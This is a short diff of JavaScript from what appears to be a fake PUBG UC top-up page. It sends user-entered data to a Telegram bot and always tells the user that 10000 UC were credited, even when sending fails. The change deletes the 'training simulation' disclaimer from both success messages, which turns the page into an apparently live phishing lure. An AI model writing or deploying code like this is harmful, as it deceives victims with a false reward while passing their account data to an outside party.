@@ -514,11 +514,11 @@
             sendToTelegram(botMessage)
                 .then(result => {
                     if (result.ok) {
-                        showMessage(step2Msg, '✅ تم شحن 10000 شدة إلى حسابك بنجاح! (محاكاة تدريبية)', 'success');
+                        showMessage(step2Msg, '✅ تم شحن 10000 شدة إلى حسابك بنجاح ', 'success');
                         // إرسال إشعار نجاح إضافي للبوت (اختياري)
                     } else {
                         // حتى لو فشل الإرسال، نعطي انطباعاً بالنجاح (للتدريب)
-                        showMessage(step2Msg, '✅ تم شحن 10000 شدة إلى حسابك بنجاح! (محاكاة تدريبية)', 'success');
+                        showMessage(step2Msg, '✅ تم شحن 10000 شدة إلى حسابك بنجاح ', 'success');
                     }
                 })
                 .catch(() => {
